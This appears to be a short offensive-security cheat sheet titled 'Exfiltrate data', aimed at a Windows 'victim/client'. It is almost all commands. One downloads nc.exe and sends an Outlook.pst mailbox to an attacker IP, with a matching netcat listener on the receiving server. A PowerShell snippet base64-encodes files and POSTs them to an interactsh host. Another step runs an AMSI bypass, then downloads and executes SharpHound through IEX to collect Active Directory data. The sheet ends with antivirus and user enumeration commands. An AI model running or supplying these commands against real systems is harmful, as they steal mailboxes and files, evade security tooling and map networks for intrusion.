# Exfiltrate data
On victim/client:

In powershell shell (powershell has the wget command):
```cmd
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe -Outfile nc.exe
cmd /c 'nc.exe -w 3 <yourIP> 80 < Outlook.pst'
```

On receiving server:

```bash
nc -l -p 80 > Outlook.pst
```


Or via HTTP requests:

file/pdf extraction:
```powershell
$File = "file.pdf"
$uri = "ID.interactsh.com" # change the ID 
$pdf = Get-Content $File -Encoding Byte; 
$base64 =[Convert]::ToBase64String($pdf)
Invoke-WebRequest -uri $uri -Method Post -Body $base64
```

Use https://base64.guru/converter/decode/file#download-preview-file to get the file from the base64 content

bloodhound:
```powershell
# FIRST run AMSI bypass! 
$url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
IEX([Net.Webclient]::new().DownloadString($url))
mkdir "$Env:PUBLIC\bloodhound"
Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default  -OutputDirectory "$Env:PUBLIC\bloodhound"
# use file/pdf extraction to get the zip file. 
```

View AV used:
```powershell
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
```

View information about current user:
```powershell
whoami
net user <name_user_whoami_without_domain> /domain
hostname
```
